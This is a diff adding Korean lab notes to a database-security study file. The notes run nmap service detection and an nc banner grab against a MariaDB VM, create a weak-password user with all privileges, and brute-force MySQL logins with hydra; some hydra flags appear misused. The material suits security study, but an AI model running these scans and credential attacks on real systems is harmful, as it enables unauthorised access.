@@ -250,3 +250,42 @@ Query OK, 0 rows affected (0.001 sec)
 	-  TDE 기본으로 상시 적용
 	-  주민등록번호, 패스워드 등은 애플리케이션 암호화를 사용
 	-  패스워드는 일방향 암호화
+
+
+
+
+
+**KALI -> Rocky port scan**
+nmap -p 1433,3306,1521 -sV 192.168.63.128
+
+```
+# nmap -p 1433,3306,1521 -sV 192.168.63.128  
+Starting Nmap 7.94 ( https://nmap.org ) at 2026-07-28 03:16 EDT
+Nmap scan report for 192.168.63.128
+Host is up (0.00065s latency).
+
+PORT     STATE    SERVICE  VERSION
+1433/tcp filtered ms-sql-s
+1521/tcp filtered oracle
+3306/tcp open     mysql    MySQL 5.5.5-10.5.29-MariaDB
+MAC Address: 00:0C:29:38:A7:A0 (VMware)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
+
+
+// 열려있는 포트 접근해서 포트 버전 정보 확인
+# nc -w 1 192.168.63.128 3306            
+Y
+5.5.5-10.5.29-MariaDBNX^NMx6B'���<8C(>@fa3x&Nmysql_native_password     
+```
+
+
+계정 로그인 (무차별 대입 공격)
+- CREATE USER 'test'@'192.168.%.%' IDENTIFIED BY 'P@SSW0RD';
+GRANT ALL PRIVILEGES ON *.* TO 'test'@'192.168.%.%' WITH GRANT OPTION;
+
+
+- hydra -L test -P P@ssW0RD 192.168.63.128 mysql
+- -> webhacking과 kali 쪽에 하나씩 공격 ㄱㄱ.
+-  hydra -l /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.63.128 mysql
